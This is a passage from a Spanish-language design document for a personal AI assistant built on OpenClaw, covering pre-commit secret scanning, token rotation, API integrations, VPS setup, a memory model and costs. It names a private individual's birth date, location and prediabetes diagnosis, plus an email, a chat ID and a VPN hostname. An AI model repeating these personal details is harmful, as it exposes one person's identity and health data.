- CRITICAL issues >0 → Telegram inmediato
- HIGH issues >2 → Discord morning report
- Tampering detected → Telegram + Discord + email (triple redundancia)

### 5.3 Pre-commit Hooks

**Hook:** `.git/hooks/pre-commit` (o husky)

**Checks:**
1. **Secrets scanner:** `git secrets --scan` + `trufflehog`
2. **Cron validator:** Si `cron/jobs.json` changed → Validar sintaxis/deps
3. **Path validator:** No commit paths con `/home/mleon/` o IPs
4. **Token detector:** Busca `sk-`, `Bearer `, API keys conocidos

**Decisión:**
- Fail → Block commit (exit 1)
- Pass → Allow commit
- Override: `git commit --no-verify` (loggea a memory/force-commits.log)

### 5.4 Rotación de Tokens (Q2 2026)

**Cron:** `security:rotate-gateway-token` (trimestral)

**Tokens a rotar:**
- Telegram bot token
- Discord bot token
- GitHub PAT (personal access token)
- Anthropic API key (si comprometido)
- Google OAuth refresh token (si comprometido)

**Proceso:**
1. Genera nuevo token en provider
2. Actualiza `.openclaw/.env`
3. Test que funciona (health check)
4. Revoca token antiguo
5. Commit cambio a GitHub (con secret redactado)
6. Notifica a Manu

---

## 6. Integraciones Externas

### 6.1 Anthropic (Claude)

**Uso:** Primary LLM (Opus, Sonnet, Haiku)  
**Auth:** API key (x-api-key header)  
**Endpoints:**
- `POST /v1/messages` — Chat completion
- `POST /v1/messages/stream` — Streaming (no usado actualmente)

**Rate limits:** No públicos, monitoreados via spend tracking

**Configuración:**
```bash
# .openclaw/.env
ANTHROPIC_API_KEY=sk-ant-...
```

**Failover:** Si health check falla → Switch a Google Gemini

### 6.2 Google (Gemini, Workspace)

**Uso:**
- Gemini Flash (LLM secundario)
- Gmail API (email)
- Calendar API (scheduling)
- Drive API (backup storage)
- Sheets API (finanzas)
- Docs API (documentos)

**Auth:** OAuth 2.0 (refresh token) + API key (Gemini)

**Tools:**
- `gog` CLI (Google Workspace)
- Direct API calls (scripts)

**Rate limits:**
- Gemini: 1500 RPD (free tier)
- Drive: 1000 requests/100s (free tier)
- Gmail: 1 billion quota units/day (generous)

**Configuración:**
```bash
# .openclaw/.env
GOOGLE_API_KEY=AIza...  # Gemini
GOG_KEYRING_BACKEND=file
GOG_KEYRING_PASSWORD=<REDACTED>
GOG_ACCOUNT=lolaopenclaw@gmail.com
```

### 6.3 Telegram

**Uso:** Primary communication channel

**Auth:** Bot token

**Endpoints:**
- `POST /bot<token>/sendMessage` — Enviar texto
- `POST /bot<token>/sendDocument` — Enviar archivo
- `POST /bot<token>/getUpdates` — Polling (webhook no usado)

**Rate limits:** 30 msg/second (burst), 20 msg/minute per chat

**Configuración:**
```bash
# .openclaw/.env
TELEGRAM_BOT_TOKEN=<REDACTED>
TELEGRAM_CHAT_ID=6884477
```

### 6.4 Discord

**Uso:** Reports consolidados

**Auth:** Bot token

**Endpoints:**
- `POST /channels/<id>/messages` — Send message
- `POST /channels/<id>/messages` (with embeds) — Rich messages

**Rate limits:** 50 requests/second (global), 5 messages/5s per channel

**Configuración:**
```bash
# .openclaw/.env
DISCORD_BOT_TOKEN=<REDACTED>
DISCORD_CHANNEL_ID=<REDACTED>  # #📊-reportes-matutino
```

### 6.5 Garmin Connect

**Uso:** Health data sync (activities, HR, stress, sleep)

**Auth:** OAuth 1.0a (3-legged)

**Endpoints:**
- `GET /wellness-api/rest/user/id` — User ID
- `GET /wellness-api/rest/dailies` — Daily summaries
- `GET /wellness-api/rest/activities` — Activities
- `GET /wellness-api/rest/heartRate` — HR data

**Rate limits:** No públicos, pero conservadores (1 req/5s recomendado)

**Configuración:**
```bash
# OAuth tokens almacenados en ~/.garminconnect/
# Display: Manu_Lazarus
```

**Scripts:**
- `garmin-health-report.sh` — Daily sync
- `garmin-activities-to-sheets.py` — Historical export
- `garmin-json-export.sh` — Raw JSON dump

### 6.6 GitHub

**Uso:** Code hosting (repos), issues, PRs, CI

**Auth:** Personal Access Token (PAT)

**Endpoints:**
- `GET /user` — Auth check
- `GET /repos/<owner>/<repo>` — Repo info
- `GET /repos/<owner>/<repo>/issues` — Issues list
- `POST /repos/<owner>/<repo>/issues` — Create issue
- `POST /repos/<owner>/<repo>/pulls` — Create PR

**Rate limits:** 5000 requests/hour (authenticated)

**Repos:**
- `lolaopenclaw/finanzas-personal` (privado)
- `lolaopenclaw/lola-toolkit` (público)
- `lolaopenclaw/surf-coach-ai` (privado, compartido con RagnarBlackmade)

**Política:**
- ✅ Código, scripts, skills, docs
- ❌ NUNCA secrets, keys, tokens, IPs, paths con usuario

**Rotación PAT:** Q2 2026

### 6.7 Brave Search

**Uso:** Web search (fallback: Google Custom Search)

**Auth:** API key

**Endpoints:**
- `GET /v1/web/search?q=<query>` — Web search
- `GET /v1/news/search?q=<query>` — News search

**Rate limits:** 2000 requests/month (free tier)

**Configuración:**
```bash
# .openclaw/.env
BRAVE_SEARCH_API_KEY=<REDACTED>
```

**Tracking:** `memory/api-usage-tracking.json` (monitoreado por rate-limit-monitor.py)

---

## 7. Infraestructura

### 7.1 VPS Ubuntu

**Provider:** (No especificado, asumo Hetzner/DigitalOcean/similar)  
**OS:** Ubuntu 24.04 LTS (Noble Numbat)  
**RAM:** 16GB  
**CPU:** 8 cores  
**Storage:** SSD (tamaño no especificado, >100GB asumido)  
**Network:** 1 Gbps (asumido)

**Hostname:** `lola-openclaw-vps.taild8eaf6.ts.net` (Tailscale)

**Uptime target:** ≥99% mensual (<7.2h downtime/month)

**Monitoring:**
- Gateway health check (hourly)
- Disk space check (daily)
- Memory usage check (daily)
- CPU usage check (daily)

### 7.2 Tailscale VPN

**Uso:** Acceso remoto seguro (SSH desde laptop)

**Configuración:**
- VPS en tailnet `taild8eaf6`
- Laptop también en tailnet
- SSH via `ssh lola-openclaw-vps.taild8eaf6.ts.net`

**Ventajas:**
- No exponer puerto SSH público
- Encriptación end-to-end
- ACLs configurables

### 7.3 systemd Service

**Service file:** `/etc/systemd/system/openclaw-gateway.service`

**Configuración:**
```ini
[Unit]
Description=OpenClaw Gateway
After=network.target

[Service]
Type=simple
User=<REDACTED_USER>
WorkingDirectory=/home/<REDACTED_USER>/.openclaw
ExecStart=/usr/local/bin/openclaw gateway start
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Gestión:**
```bash
sudo systemctl status openclaw-gateway
sudo systemctl restart openclaw-gateway
sudo systemctl enable openclaw-gateway  # Auto-start on boot
```

**Logs:**
```bash
journalctl -u openclaw-gateway -n 100 --no-pager
journalctl -u openclaw-gateway -f  # Follow
```

### 7.4 npm Global

**OpenClaw install:**
```bash
npm install -g openclaw@latest
```

**Skills install:**
```bash
openclaw skills install <skill-name>
```

**Version:** OpenClaw v2026.2.22 (current)

**Update cron:** `🔄 Auto-update OpenClaw` (21:30 daily)

---

## 8. Modelo de Datos (Memoria)

### 8.1 Estructura SOUL → MEMORY → Daily → Entities

**Jerarquía:**

```
SOUL.md (Identidad, personalidad)
    ↓
MEMORY.md (Índice, punteros a subsecciones)
    ↓
memory/YYYY-MM-DD.md (Daily logs cronológicos)
    ↓
memory/learnings.md (Lecciones filtradas, temáticas)
    ↓
memory/decisions.md (Decisiones técnicas con razones)
    ↓
memory/entities/ (Knowledge graph, PARA)
    ↓
memory/entities/areas/people/manu.json (Atomic facts)
```

**SOUL.md:**
- Personalidad, tono, principios
- No cambia frecuentemente (solo evoluciona)
- Fuente de verdad para "quién soy"

**MEMORY.md:**
- Índice de toda la memoria
- Punteros a archivos importantes
- "Mapa" del workspace

**Daily logs (YYYY-MM-DD.md):**
- Cronológico, todo lo que ocurrió ese día
- Format: Markdown con headers por sesión
- Usado para "¿qué pasó ayer?"

**Learnings.md:**
- Filtrado temático: solo lo importante
- Evita repetir errores
- Format: Tabla con fecha, categoría, learning, contexto

**Decisions.md:**
- Decisiones técnicas con razones y alternativas descartadas
- Consultar antes de tomar decisiones similares
- Format: Tabla con fecha, decisión, razón, alternativas

**Entities (PARA - Projects, Areas, Resources, Archives):**
- Knowledge graph estructurado
- Atomic facts (JSON) + summaries (MD auto-generados)
- Decay semanal (Hot/Warm/Cold)

### 8.2 Atomic Facts (Entities)

**Ejemplo: manu.json**
```json
{
  "id": "manu",
  "type": "person",
  "facts": [
    {
      "id": "fact-001",
      "fact": "Nació el 16 de febrero de 1978",
      "source": "USER.md",
      "confidence": 1.0,
      "added": "2026-02-22",
      "last_accessed": "2026-03-24"
    },
    {
      "id": "fact-002",
      "fact": "Ubicación actual: Logroño, La Rioja, España",
      "source": "USER.md",
      "confidence": 1.0,
      "added": "2026-02-22",
      "last_accessed": "2026-03-24"
    },
    {
      "id": "fact-003",
      "fact": "Prediabetes con HbA1c ~6.0% (marzo 2026)",
      "source": "memory/garmin/tendencias.md",
      "confidence": 0.9,
      "added": "2026-03-15",
      "last_accessed": "2026-03-24"
    }
  ]
}
```

**Auto-generado: manu.md**
```markdown
# Manu (Manuel León Mendiola)

## Datos Básicos
- **Nacimiento:** 16 de febrero de 1978 (48 años)
- **Ubicación:** Logroño, La Rioja, España

## Salud
- Prediabetes con HbA1c ~6.0% (marzo 2026)

_[Auto-generado desde manu.json — No editar manualmente]_
```

### 8.3 Memory Decay (Hot/Warm/Cold)

**Cron:** `memory-decay-weekly` (domingo 23:00)  
**Script:** `scripts/memory-decay.sh`

**Tiers:**

**Hot (<7 días):**
- Mantener en memory/ raíz
- Acceso rápido
- No comprimir

**Warm (7-30 días):**
- Mover a memory/archive/YYYY-MM/
- Comprimir con gzip (opcional)
- Acceso ocasional

**Cold (>30 días):**
- Comprimir a memory/archive/YYYY-MM.tar.gz
- Acceso raro
- Búsqueda via `rg` después de descomprimir

**Excepciones (nunca decay):**
- `SOUL.md`, `USER.md`, `AGENTS.md`, `TOOLS.md`, `PROJECTS.md`
- `MEMORY.md`, `learnings.md`, `decisions.md`
- `memory/entities/` (protegido por `.autoimprove-skip`)
- Archivos con `last_accessed` reciente (≤7 días)

**Trigger decay:**
```bash
# Manual (testing)
bash scripts/memory-decay.sh --dry-run

# Cron (producción)
openclaw cron trigger memory-decay-weekly
```

---

## 9. Coste Operativo

### 9.1 Breakdown Mensual

**Estimado: $78.40-133.40/mes (promedio ~$106)**

| Categoría | Servicio | Coste Mensual | Notas |
|-----------|----------|---------------|-------|
| **LLM (Main)** | Anthropic Opus | $30-60 | Sesión principal con Manu |
| **LLM (Subagents)** | Anthropic Sonnet | $20-40 | Tasks complejas, research |
| **LLM (Bulk)** | Google Gemini Flash | $5-10 | Verificación, bulk tasks |
| **LLM (Crons rutinarios)** | Anthropic Haiku | $9 | 15 crons × ~$0.02/día |
| **LLM (Crons críticos)** | Anthropic Sonnet | $14.40 | 6 crons × ~$0.08/día |
| **TTS** | Google TTS | FREE | Free tier suficiente |
| **Search** | Brave Search | FREE | 2000/month suficiente |
| **Storage** | Google Drive | FREE | 15GB free tier suficiente |
| **VPS** | (Provider) | (Asumido cubierto) | No incluido aquí |
| **TOTAL** | | **$78.40-133.40** | |

### 9.2 Optimizaciones Aplicadas

1. **Multi-model strategy:** Sonnet/Haiku/Flash en vez de todo Opus → **~$80/mes saved**
2. **Cron spacing:** Evita rate limits, reduce retries → **~$5/mes saved**
3. **Subagent validation caching:** Reusa decisiones para patrones repetidos → **~$2/mes saved**
4. **TTS local (edge-tts):** Gratis vs Google Cloud TTS ($4/1M chars) → **~$3/mes saved**
5. **Brave Search free tier:** vs Google Custom Search ($5/1K queries) → **~$10/mes saved**

**Total optimización: ~$100/mes saved** (sin optimizaciones: ~$200/mes)

### 9.3 Rate Limit Monitoring

**Script:** `scripts/rate-limit-monitor.py` (ver Sección 2.4.2)

**Tracking:**
- Anthropic: $122/mes actual (marzo 2026)
- Google Gemini: ~300 RPD actual (20% de quota)
- Brave Search: ~400/mes actual (20% de quota)

**Alerts:**
- >80% quota → Warning
- >90% quota → Alert + suggest action

---

## 10. Referencias

### 10.1 Documentación Interna

- [SOUL.md](../SOUL.md) — Personalidad, principios
- [USER.md](../USER.md) — Perfil de Manu
- [AGENTS.md](../AGENTS.md) — Reglas de sesión
- [TOOLS.md](../TOOLS.md) — Herramientas locales
- [PROJECTS.md](../PROJECTS.md) — Proyectos activos
- [MEMORY.md](../MEMORY.md) — Índice de memoria
- [PRD.md](../PRD.md) — Product Requirements Document

### 10.2 Documentación Memory

- [memory/decisions.md](../memory/decisions.md) — Decisiones técnicas
- [memory/learnings.md](../memory/learnings.md) — Lecciones aprendidas
- [memory/model-strategy.md](../memory/model-strategy.md) — Multi-model strategy
- [memory/delegation-strategy.md](../memory/delegation-strategy.md) — Cuándo delegar
- [memory/advanced-harness-research.md](../memory/advanced-harness-research.md) — Harness engineering
- [memory/berman-security-article.md](../memory/berman-security-article.md) — 6-layer security

### 10.3 Documentación Externa

- [OpenClaw Documentation](https://docs.openclaw.com)
- [Anthropic Claude API](https://docs.anthropic.com/en/api)
- [Google Gemini API](https://ai.google.dev/gemini-api/docs)
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [Discord API](https://discord.com/developers/docs/intro)
- [Garmin Connect API](https://developer.garmin.com/connect-api/)
- [Brave Search API](https://brave.com/search/api/)

### 10.4 Research Articles

- [Berman Security: Teaching OpenClaw to not get Hacked](https://x.com/i/status/2030423565355676100)
- [Anthropic: Constitutional AI](https://www.anthropic.com/research/constitutional-ai-harmlessness-from-ai-feedback)
- [Anthropic: Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)
- [OpenAI: Harness Engineering](https://openai.com/index/harness-engineering/)
- [Martin Fowler: Harness Engineering](https://martinfowler.com/articles/exploring-gen-ai/harness-engineering.html)

---

## 11. Changelog

| Fecha | Versión | Cambios |
|-------|---------|---------|
| 2026-03-24 | 1.0 | Versión inicial del SDD |

---

## 12. Aprobaciones

| Rol | Nombre | Fecha | Firma |
|-----|--------|-------|-------|
| **Technical Lead** | Lola (lolaopenclaw@gmail.com) | 2026-03-24 | ✅ |
| **Product Owner** | Manuel León | 2026-03-24 | _Pending_ |
| **Reviewer** | Manuel León | 2026-03-24 | _Pending_ |

---

**Próxima revisión:** Q2 2026 (abril-junio)

---

_Este SDD es un documento vivo. Evoluciona con el sistema._
